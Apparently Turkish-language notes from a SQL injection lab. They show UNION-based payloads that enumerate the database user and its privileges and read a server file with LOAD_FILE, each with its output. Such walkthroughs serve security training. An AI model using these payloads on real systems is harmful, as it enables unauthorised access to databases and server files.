# Reading Files

!!! warning

    FILE ayrıcalığı gereklidir.

## Privileges

### DB User

Mevcut kullanıcı adını öğrenmek için aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,user,3,4 FROM mysql.user-- -
```

| PORT CODE |
|---|
| root |

### User Privileges

Kullanıcının sahip olduğu ayrıcalıkları öğrenmek için aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,Super_priv,3,4 FROM mysql.user WHERE user = "root"-- -
```

| PORT CODE |
|---|
| Y |

!!! success

    Y, YES anlamına gelir.

Kullanıcının sahip olduğu diğer ayrıcalıkları öğrenmek için aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,GRANTEE,PRIVILEGE_TYPE,4 FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE GRANTEE LIKE "%root%"-- -
```

| PORT CODE | PORT CITY |
|---|---|
| 'root'@'localhost' | SELECT |
| 'root'@'localhost' | INSERT |
| 'root'@'localhost' | UPDATE |
| 'root'@'localhost' | DELETE |
| 'root'@'localhost' | CREATE |
| 'root'@'localhost' | DROP |
| 'root'@'localhost' | RELOAD |
| 'root'@'localhost' | SHUTDOWN |
| 'root'@'localhost' | PROCESS |
| 'root'@'localhost' | FILE |
| 'root'@'localhost' | REFERENCES |
| 'root'@'localhost' | INDEX |
| 'root'@'localhost' | ALTER |
| 'root'@'localhost' | SHOW |
| 'root'@'localhost' | SUPER |
| 'root'@'localhost' | CREATE |
| 'root'@'localhost' | LOCK |
| 'root'@'localhost' | EXECUTE |
| 'root'@'localhost' | REPLICATION |
| 'root'@'localhost' | REPLICATION |
| 'root'@'localhost' | CREATE |
| 'root'@'localhost' | SHOW |
| 'root'@'localhost' | CREATE |
| 'root'@'localhost' | ALTER |
| 'root'@'localhost' | CREATE |
| 'root'@'localhost' | EVENT |
| 'root'@'localhost' | TRIGGER |
| 'root'@'localhost' | CREATE |
| 'root'@'localhost' | DELETE |

## LOAD_FILE

[LOAD_FILE](https://mariadb.com/kb/en/load_file/) fonksiyonu ile bir dosya okumak için aşağıda verilen enjeksiyonu kullanalım:

```sql title="Payload"
CN' UNION SELECT 1,LOAD_FILE("/etc/hostname"),3,4-- -
```

| PORT CODE |
|---|
| # Kubernetes-managed hosts file. 127.0.0.1 localhost ::1 localhost ip6-localhost ip6-loopback fe00::0 ip6-localnet fe00::0 ip6-mcastprefix fe00::1 ip6-allnodes fe00::2 ip6-allrouters 192.168.210.68 ng-954801-basicsqlireadfile-zw802-6948bb5688-bjd9r |
